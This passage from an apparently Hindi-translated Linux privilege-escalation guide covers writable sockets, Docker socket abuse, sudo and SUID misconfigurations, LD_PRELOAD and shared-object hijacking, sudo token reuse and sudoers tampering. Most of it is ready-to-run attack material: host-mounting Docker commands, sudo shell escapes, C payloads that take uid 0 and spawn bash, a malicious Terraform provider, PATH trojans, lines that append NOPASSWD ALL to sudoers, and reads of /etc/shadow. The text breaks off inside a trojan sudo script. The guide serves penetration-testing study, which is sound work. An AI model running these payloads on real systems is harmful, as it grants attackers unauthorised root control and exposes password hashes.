यदि आप किसी **writable** `.socket` फ़ाइल को पाते हैं तो आप `[Socket]` सेक्शन की शुरुआत में कुछ इस तरह जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बनने से पहले execute हो जाएगा। इसलिए, आपको **संभावतः मशीन के reboot होने तक इंतज़ार करना होगा।**\
_ध्यान दें कि सिस्टम को उस socket फ़ाइल कॉन्फ़िगरेशन का उपयोग करना चाहिए वरना backdoor execute नहीं होगा_

### Writable sockets

यदि आप कोई **writable socket** पहचानते हैं (_अब हम config `.socket` फ़ाइलों की बात नहीं कर रहे हैं बल्कि Unix Sockets की बात कर रहे हैं_), तो आप उस socket के साथ **communicate** कर सकते हैं और संभवतः कोई vulnerability exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ बल्कि उन फाइलों की जो unix sockets के रूप में कार्य करती हैं_). आप इसे निम्न से जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और शायद **exploit some vulnerability**।

### Writable Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर मिलता है, एक महत्वपूर्ण फ़ाइल है जिसे सुरक्षित रखना चाहिए। डिफ़ॉल्ट रूप से, यह `root` user और `docker` group के सदस्यों के लिए writable होता है। इस socket पर write access होने से privilege escalation हो सकती है। यहाँ बताया गया है कि यह कैसे किया जा सकता है और वैकल्पिक तरीके यदि Docker CLI उपलब्ध न हो।

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर write access है, तो आप निम्नलिखित commands का उपयोग करके privileges escalate कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको होस्ट के फ़ाइल सिस्टम तक root-level access के साथ एक container चलाने की अनुमति देती हैं।

#### **Docker API का सीधे उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को Docker API और `curl` कमांड्स का उपयोग करके अभी भी manipulate किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ऐसा request भेजें जो host सिस्टम की root directory को mount करने वाला container बनाए।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नया बनाया गया container शुरू करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` का उपयोग करके container से एक connection स्थापित करें, जिससे इसके अंदर command execute कर सकें।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` connection सेट करने के बाद, आप container के अंदर सीधे commands execute कर सकते हैं और host की filesystem पर root-level access प्राप्त कर सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) मौजूद हैं। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

नीचे देखें: 

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप पाते हैं कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप पाते हैं कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक उन्नत inter-Process Communication (IPC) सिस्टम है जो applications को प्रभावी ढंग से इंटरैक्ट और डेटा साझा करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया यह विभिन्न प्रकार के application communication के लिए एक मजबूत फ्रेमवर्क प्रदान करता है।

यह सिस्टम बहुमुखी है, बुनियादी IPC का समर्थन करता है जो प्रक्रियाओं के बीच डेटा विनिमय को बढ़ाता है, जो कि enhanced UNIX domain sockets की तरह है। इसके अलावा, यह इवेंट्स या सिग्नल्स को प्रसारित करने में मदद करता है, जिससे सिस्टम घटकों के बीच seamless integration होती है। उदाहरण के लिए, किसी Bluetooth daemon से आने वाला एक सिग्नल किसी music player को mute करने के लिए प्रेरित कर सकता है, जिससे उपयोगकर्ता अनुभव बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object system का समर्थन करता है, जो सेवाओं के अनुरोध और applications के बीच method invocations को सरल बनाता है और उन प्रक्रियाओं को streamline करता है जो पारंपरिक रूप से जटिल थीं।

D-Bus एक allow/deny model पर काम करता है, जो matching policy rules के cumulative प्रभाव के आधार पर संदेश अनुमतियाँ (method calls, signal emissions, आदि) प्रबंधित करता है। ये नीतियाँ bus के साथ इंटरैक्शन को निर्दिष्ट करती हैं, और इन अनुमतियों का दुरुपयोग privilege escalation के लिए किया जा सकता है।

एक ऐसी नीति का उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root user को `fi.w1.wpa_supplicant1` का मालिक बनने, उसे संदेश भेजने और उससे संदेश प्राप्त करने की अनुमति का विवरण देती है।

यदि किसी नीति में user या group निर्दिष्ट नहीं है तो वह सार्वभौमिक रूप से लागू होती है, जबकि "default" context नीतियाँ उन सभी पर लागू होती हैं जिन्हें अन्य विशिष्ट नीतियाँ कवर नहीं करतीं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ D-Bus communication को enumerate और exploit करना सीखें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

यह हमेशा रोचक होता है कि network को enumerate करके machine की स्थिति का पता लगाया जाए।

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उन network services को चेक करें जो मशीन पर चल रही हों और जिनसे आप उसे एक्सेस करने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँच करें कि क्या आप traffic को sniff कर सकते हैं। यदि आप कर पाते हैं, तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

जाँचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** मौजूद हैं, कौन **login** कर सकते हैं और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा UID

Some Linux versions were affected by a bug that allows users with **UID > INT_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
इसे exploit करने के लिए उपयोग करें: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप किसी ऐसे **समूह के सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्लिपबोर्ड के अंदर कुछ दिलचस्प तो नहीं है (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

यदि आप वातावरण का **कोई भी पासवर्ड जानते हैं** तो उस पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने** का प्रयास करें।

### Su Brute

यदि आप बहुत शोर करने की परवाह नहीं करते हैं और `su` और `timeout` बाइनरी कंप्यूटर पर मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ताओं पर brute-force करने का प्रयास कर सकते हैं.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` पैरामीटर के साथ भी उपयोगकर्ताओं पर brute-force करने की कोशिश करता है।

## Writable PATH abuses

### $PATH

यदि आप पाते हैं कि आप **$PATH के किसी फ़ोल्डर के अंदर लिख सकते हैं** तो आप कुछ कमांड के नाम से **writable फ़ोल्डर के अंदर backdoor बनाने** के जरिए privileges बढ़ा सकते हैं — वह कमांड किसी अलग उपयोगकर्ता (आदर्शतः root) द्वारा चलाया जाएगा और वह $PATH में आपके writable फ़ोल्डर से पहले स्थित किसी फ़ोल्डर से **लोड नहीं होता**।

### SUDO and SUID

आपको कुछ कमांड sudo का उपयोग करके चलाने की अनुमति मिल सकती है या उन पर suid bit सेट हो सकता है। इसे जांचने के लिए उपयोग करें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित कमांड आपको फ़ाइलें पढ़ने और/या लिखने या यहाँ तक कि एक कमांड निष्पादित करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी उपयोगकर्ता को किसी अन्य उपयोगकर्ता के अधिकारों के साथ कुछ कमांड पासवर्ड जाने बिना निष्पादित करने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है; अब root directory में एक ssh key जोड़कर या `sh` को कॉल करके एक shell प्राप्त करना बहुत आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को किसी चीज़ को निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **vulnerable** था और **PYTHONPATH hijacking** के जरिए script को root के रूप में execute करते समय किसी भी python library को load करने की अनुमति देता था:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep के माध्यम से संरक्षित → root shell

यदि sudoers `BASH_ENV` संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash की गैर-इंटरैक्टिव स्टार्टअप व्यवहार का लाभ उठाकर किसी अनुमत कमांड को चलाते समय root के रूप में arbitrary कोड चला सकते हैं।

- Why it works: गैर-इंटरैक्टिव shells के लिए, Bash `$BASH_ENV` को evaluate करता है और target script चलाने से पहले उस फ़ाइल को source करता है। कई sudo नियम एक स्क्रिप्ट या shell wrapper चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा preserve किया गया है, तो आपकी फ़ाइल root privileges के साथ source हो जाती है।

- Requirements:
- A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
- `BASH_ENV` present in `env_keep` (check with `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- हार्डनिंग:
- `BASH_ENV` (और `ENV`) को `env_keep` से हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- जब preserved env vars का उपयोग हो रहा हो तो sudo I/O logging और alerting पर विचार करें।

### Terraform via sudo with preserved HOME (!env_reset)

यदि sudo environment को बिना बदले रखता है (`!env_reset`) और `terraform apply` की अनुमति देता है, तो `$HOME` कॉल करने वाले user के रूप में ही रहता है। इसलिए Terraform root के रूप में **$HOME/.terraformrc** लोड करता है और `provider_installation.dev_overrides` को मानता है।

- आवश्यक provider को एक writable directory पर निर्देशित करें और provider के नाम वाला एक malicious plugin डालें (उदा., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform Go plugin handshake विफल कर देगा, लेकिन मरने से पहले payload को root के रूप में execute करेगा और एक SUID shell पीछे छोड़ देगा।

### TF_VAR ओवरराइड्स + symlink validation bypass

Terraform variables को `TF_VAR_<name>` environment variables के माध्यम से दिया जा सकता है, जो तब भी बच जाते हैं जब sudo environment को preserve करता है। कमज़ोर validations जैसे `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` को symlinks के साथ bypass किया जा सकता है:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resolves the symlink and copies the real `/root/root.txt` into an attacker-readable destination. The same approach can be used to **लिखना** into privileged paths by pre-creating destination symlinks (e.g., pointing the provider’s destination path inside `/etc/cron.d/`).

### requiretty / !requiretty

On some older distributions, sudo can be configured with `requiretty`, which forces sudo to run only from an interactive TTY. If `!requiretty` is set (or the option is absent), sudo can be executed from non-interactive contexts such as reverse shells, cron jobs, or scripts.
```bash
Defaults !requiretty
```
यह अपने आप में एक direct vulnerability नहीं है, लेकिन यह उन स्थितियों को बढ़ाता है जहाँ sudo नियमों का दुरुपयोग पूरी PTY की आवश्यकता के बिना किया जा सकता है।

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

यदि `sudo -l` में `env_keep+=PATH` दिखे या `secure_path` में attacker-writable entries (जैसे `/home/<user>/bin`) मौजूद हों, तो sudo-allowed target के अंदर कोई भी relative command shadow किया जा सकता है।

- आवश्यकताएँ: एक sudo rule (अक्सर `NOPASSWD`) जो ऐसा script/binary चलाता है जो absolute paths के बिना commands (`free`, `df`, `ps`, etc.) को कॉल करता है और एक writable PATH entry जो पहले खोजी जाती है।
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution को पाथ्स से बाइपास करना
**Jump** करके दूसरी फाइलें पढ़ें या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers file में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** (\*) का उपयोग किया जाता है, तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

यदि किसी एक कमांड को **sudo permission** दिया गया है **बिना path निर्दिष्ट किए**: _hacker10 ALL= (root) less_ तो आप इसे PATH variable बदलकर exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी इस्तेमाल की जा सकती है अगर एक **suid** binary **किसी अन्य command को बिना उसका path specify किए execute करता है (हमेशा किसी अजीब SUID binary की सामग्री _**strings**_ से जाँच करें)**।

[चलाने के लिए Payload उदाहरण.](payloads-to-execute.md)

### SUID binary जिसमें command path हो

यदि **suid** binary **किसी अन्य command को path specify करते हुए execute करता है**, तो आप उस command के नाम का एक function बनाकर उसे **export a function** करने की कोशिश कर सकते हैं जो suid file कॉल कर रहा है।

उदाहरण के लिए, अगर एक suid binary calls _**/usr/sbin/service apache2 start**_ तो आपको उस function को बनाकर और export करने की कोशिश करनी चाहिए:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid बाइनरी को कॉल करेंगे, यह फ़ंक्शन निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) को निर्दिष्ट करने के लिए किया जाता है, जिन्हें loader द्वारा अन्य सभी लाइब्रेरीज़, सहित standard C library (`libc.so`), से पहले लोड किया जाता है। इस प्रक्रिया को लाइब्रेरी का प्रीलोड (preloading a library) कहा जाता है।

हालाँकि, सिस्टम सुरक्षा बनाए रखने और इस फ़ीचर के विशेष रूप से **suid/sgid** executables के साथ दुरुपयोग को रोकने के लिए, सिस्टम कुछ शर्तें लागू करता है:

- लोडर उन executables के लिए **LD_PRELOAD** को अनदेखा कर देता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- suid/sgid वाले executables के लिए, केवल वे लाइब्रेरीज़ प्रीलोड की जाती हैं जो standard paths में होती हैं और जो स्वयं भी suid/sgid होती हैं।

Privilege escalation तब हो सकता है जब आपके पास `sudo` के साथ कमांड चलाने की क्षमता हो और `sudo -l` का आउटपुट **env_keep+=LD_PRELOAD** कथन शामिल करता हो। यह कॉन्फ़िगरेशन **LD_PRELOAD** environment variable को बनाए रखने और `sudo` के साथ कमांड चलाने पर भी मान्यता प्राप्त होने की अनुमति देता है, जिससे संभवतः arbitrary code का निष्पादन elevated privileges के साथ हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
इसे **/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **compile it** करने के लिए:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाएँ
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग किया जा सकता है यदि attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी binary में असामान्य दिखने वाली **SUID** permissions हों, तो यह अच्छी प्रैक्टिस है कि यह सत्यापित किया जाए कि वह सही तरीके से **.so** फाइलें लोड कर रहा है या नहीं। इसे निम्नलिखित कमांड चलाकर जांचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर exploitation की संभावना संकेतित होती है।

इसे exploit करने के लिए, आप एक C फ़ाइल बनाएँगे, उदाहरण के लिए _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार compiled और executed हो जाने पर, file permissions को बदलकर और elevated privileges के साथ एक shell execute करके privileges बढ़ाने का प्रयास करता है।

ऊपर के C file को shared object (.so) file में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने से exploit ट्रिगर होनी चाहिए, जिससे संभावित system compromise संभव हो सके।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो उस folder से एक library लोड करता है जहाँ हम लिख सकते हैं, तो चलिए उसी folder में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको इस तरह की त्रुटि मिलती है:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) एक curated list है Unix binaries का जिन्हें एक attacker द्वारा local security restrictions bypass करने के लिए exploit किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) भी यही चीज़ है लेकिन उन मामलों के लिए जहाँ आप कमांड में **only inject arguments** कर सकते हैं।

प्रोजेक्ट Unix binaries के legitimate functions इकट्ठा करता है जिन्हें abuse करके restricted shells से बाहर निकला जा सकता है, privileges escalate या maintain किए जा सकते हैं, files transfer किए जा सकते हैं, bind और reverse shells spawn किए जा सकते हैं, और अन्य post-exploitation tasks में मदद मिल सकती है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` तक पहुंच सकते हैं तो आप टूल [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर सकते हैं यह जांचने के लिए कि क्या यह किसी भी sudo rule को exploit करने का तरीका ढूँढता है।

### Reusing Sudo Tokens

ऐसे मामलों में जहाँ आपके पास **sudo access** है लेकिन password नहीं है, आप privileges escalate कर सकते हैं **waiting for a sudo command execution and then hijacking the session token** करके।

Privileges escalate करने की आवश्यकताएँ:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell है
- "_sampleuser_" ने हाल के समय में **used `sudo`** करके कुछ execute किया हुआ है — **last 15mins** (डिफ़ॉल्ट रूप से यही sudo token की अवधि है जो हमें बिना password के `sudo` इस्तेमाल करने देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का मान 0 है
- `gdb` accessible है (आप इसे upload कर सकें)

(आप अस्थायी रूप से `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` से enable कर सकते हैं या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` modify करके `kernel.yama.ptrace_scope = 0` सेट कर सकते हैं)

यदि ये सभी आवश्यकताएँ पूरी हैं, तो आप **sudo_inject** का उपयोग करके privileges escalate कर सकते हैं: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- दूसरा **exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **owned by root with setuid** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **third exploit** (`exploit_v3.sh`) **एक sudoers file बनाएगा** जो **sudo tokens को स्थायी बनाता है और सभी उपयोगकर्ताओं को sudo उपयोग करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **किसी user और PID के लिए sudo token बनाएं**।\
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 के साथ एक shell है, तो आप पासवर्ड जाने बिना **sudo privileges प्राप्त कर सकते हैं**, ऐसा करते हुए:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा ही पढ़ी जा सकती हैं**।\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप **कुछ रोचक जानकारी प्राप्त** कर सकते हैं, और यदि आप किसी भी फाइल को **लिख** सकते हैं तो आप **escalate privileges** कर पाएंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD के लिए `sudo` बाइनरी के कुछ विकल्प हैं, जैसे `doas` — इसकी कॉन्फ़िगरेशन `/etc/doas.conf` में चेक करना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि कोई **उपयोगकर्ता आमतौर पर किसी मशीन से कनेक्ट करता है और `sudo` का उपयोग करता है** ताकि privileges बढ़ाए जा सकें और आप उस उपयोगकर्ता के context में एक shell प्राप्त कर लेते हैं, तो आप **एक नया sudo executable बना सकते हैं** जो पहले आपके कोड को root के रूप में चलाएगा और फिर उपयोगकर्ता का कमांड। फिर, **user context का $PATH संशोधित करें** (उदाहरण के लिए नया path `.bash_profile` में जोड़कर) ताकि जब उपयोगकर्ता sudo चलाए, तो आपका sudo executable ही चलें।

ध्यान दें कि अगर उपयोगकर्ता किसी अलग shell (bash नहीं) का उपयोग करता है तो आपको नया path जोड़ने के लिए अन्य फ़ाइलें संशोधित करनी पड़ेंगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या ऐसा कुछ चलाकर:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
